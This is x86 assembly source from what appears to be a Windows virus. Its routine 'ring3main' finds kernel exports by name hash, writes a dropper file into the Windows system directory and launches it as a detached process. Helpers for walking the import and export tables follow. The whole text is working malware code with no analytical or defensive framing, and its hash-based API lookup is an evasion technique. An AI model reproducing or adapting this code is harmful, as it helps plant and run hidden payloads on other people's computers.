   ; void ring3main()

   ; used to scan kernel for exports,
   ; put dropper into windows\system directory & execute it

   ring3main               proc    pascal
                           local   fname:BYTE:MAXPATH
                           local   suckendata:BYTE:128
                           pusha

                           mov_h   edi, GetSystemDirectoryA
                           call    getprocaddress
                           jz      __exit

                           push    MAXPATH
                           lea     ebx, fname
                           push    ebx
                           call    eax

                           lea     edi, fname[eax] ; eax=fname length
                           call    $+5
                           pop     esi
                           sub     esi, $-dropper_name-1
                           mov     ecx, dropper_name_size
                           cld
                           rep     movsb

                           mov_h   edi, CreateFileA
                           call    getprocaddress
                           jz      __exit

                           push    0
                           push    FILE_ATTRIBUTE_NORMAL
                           push    CREATE_ALWAYS
                           push    0
                           push    FILE_SHARE_READ
                           push    GENERIC_READ + GENERIC_WRITE
                           lea     ebx, fname
                           push    ebx
                           call    eax

                           inc     eax
                           jz      __exit
                           dec     eax

                           xchg    ebx, eax

                           mov_h   edi, WriteFile
                           call    getprocaddress
                           jz      __exit

                           xchg    esi, eax

                           push    0
                           push    esp
                           push    512
                           call    $+5
                           sub     dword ptr [esp], $-start
                           push    ebx
                           call    esi

                           push    0
                           push    esp
                           push    dropper_size
                           call    $+5
                           sub     dword ptr [esp], $-start
                           push    ebx
                           call    esi

                           mov_h   edi, CloseHandle
                           call    getprocaddress
                           jz      __exit

                           push    ebx
                           call    eax

                           mov_h   edi, CreateProcessA
                           call    getprocaddress
                           jz      __exit

                           lea     edx, suckendata
                           xor     ecx, ecx
                           mov     [edx], ecx

                           push    edx             ; lpProcessInformation
                           push    edx             ; lpStartupInfo
                           push    ecx             ; lpCurrentDirectory
                           push    ecx             ; lpEnvironment
                           push    IDLE_PRIORITY_CLASS+DETACHED_PROCESS ; dwCreationFlags
                           push    ecx             ; bInheritHandles
                           push    ecx             ; lpThreadAttributes
                           push    ecx             ; lpProcessAttributes
                           push    ecx             ; lpCommandLine
                           lea     ebx, fname
                           push    ebx             ; lpApplicationName
                           call    eax

   __exit:                 popa
                           ret
                           endp

   ; subroutine: getprocaddress
   ; input:      EDI=hash
   ; output:     ZF,EAX=proc

   getprocaddress:         pusha
                           call    get_base_ebp
                           mov     ebx, old_eip x
                           call    __scan_imgbase          ; EBX <-- PE imagebase
                           mov     ecx, [ebx].mz_neptr     ; ECX <-- importtable
                           mov     ecx, [ebx+ecx].pe_importtablerva
                           sub     ecx, size im_struct
   __cycle:                add     ecx, size im_struct
                           mov     eax, [ebx+ecx].im_namerva
                           or      eax, eax
                           jz      __exit
                           mov     eax, [ebx+eax]
                           or      eax, 20202020h
                           neg     eax
                           cmp     eax, -'nrek'
                           jne     __cycle
                           mov     ecx, [ebx+ecx].im_addresstablerva ; adrtbl
                           mov     ebx, [ebx+ecx]          ; any proc in 1st lib
                           call    __scan_imgbase          ; EBX <-- PE imagebase
                           ; no EBX=imagebase of 1st library in imports,
                           ; we hope it is KERNEL32.DLL ;-)
                           mov     ecx, [ebx].mz_neptr     ; ECX <-- export
                           mov     ecx, [ebx+ecx].pe_exporttablerva
                           add     ecx, ebx
                           call    findfunc
   __exit:                 mov     [esp+7*4], eax
                           or      eax, eax
                           popa
                           ret

   __scan_imgbase:         xor     bx, bx
                           add     ebx, 65536
   __scan_1:               sub     ebx, 65536
                           cmp     [ebx].mz_id, 'ZM'
                           jne     __scan_1
                           retn

   ; find function's address in export table
   ;
   ; input:  EBX=imagebase va, ECX=export table va, EDI=name csum
   ; modify: EDX, ESI
   ; output: ZF=1, EAX=0 (function not found)
   ;         ZF=0, EAX=function va

   findfunc:               xor     esi, esi        ; current index
   __search_cycle:         lea     edx, [esi*4+ebx]
                           add     edx, [ecx].ex_namepointersrva
                           mov     edx, [edx]      ; name va
                           add     edx, ebx        ; +imagebase
                           xor     eax, eax        ; calculate hash
   __calc_hash:            rol     eax, 7
                           xor     al, [edx]
                           inc     edx
                           cmp     byte ptr [edx], 0
                           jne     __calc_hash
                           cmp     eax, edi        ; compare hashs
                           je      __name_found
                           inc     esi             ; index++
                           cmp     esi, [ecx].ex_numofnamepointers
                           jb      __search_cycle
                           xor     eax, eax        ; return 0
                           ret
   __name_found:           mov     edx, [ecx].ex_ordinaltablerva
                           add     edx, ebx        ; +imagebase
                           movzx   edx, word ptr [edx+esi*2]; edx=current ordinal
   ;                       sub     edx, [ecx].ex_ordinalbase  ; -ordinal base
                           mov     eax, [ecx].ex_addresstablerva
                           add     eax, ebx        ; +imagebase
                           mov     eax, [eax+edx*4]; eax=current address
                           add     eax, ebx        ; +imagebase
                           retn                    ; return address
